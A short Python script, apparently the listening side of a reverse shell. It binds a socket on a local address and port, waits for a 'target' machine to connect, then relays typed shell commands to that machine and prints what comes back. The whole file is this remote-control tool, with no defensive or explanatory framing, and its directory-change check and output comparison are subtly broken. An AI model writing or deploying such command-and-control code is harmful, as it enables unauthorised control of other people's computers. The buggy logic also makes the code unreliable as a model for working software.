import socket
import os
import subprocess

#─ pkill -f python  

def shell():
    current_dir = target.recv(3000)

    while True:
        command = input(f"{current_dir} -$ ").encode('utf-8')
        if command.decode('utf-8') == 'exit':
            break
        elif command.decode('utf-8').startswith('cd') == 0:
            target.send(command)
            res = target.recv(3000)
            current_dir = res
        else:
            try:
                target.send(command)
                res = target.recv(3000)
                if res == "1":
                    continue
                elif command.decode('utf-8') == "":
                    pass
                else: print(res.decode('utf-8'))
            except: 
                print("Error")
                pass


# Configuración de conexión entrante
def config():
    global server, target, ip, port

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = '192.168.100.2'
    port = 5678
    
    server.bind((ip, port))
    server.listen(5)
    print(f"Server listening on {ip}:{port}")
    
    while True:
        target, addr = server.accept()
        print(f"Connected to {addr}")
        break

config()
shell()
target.close()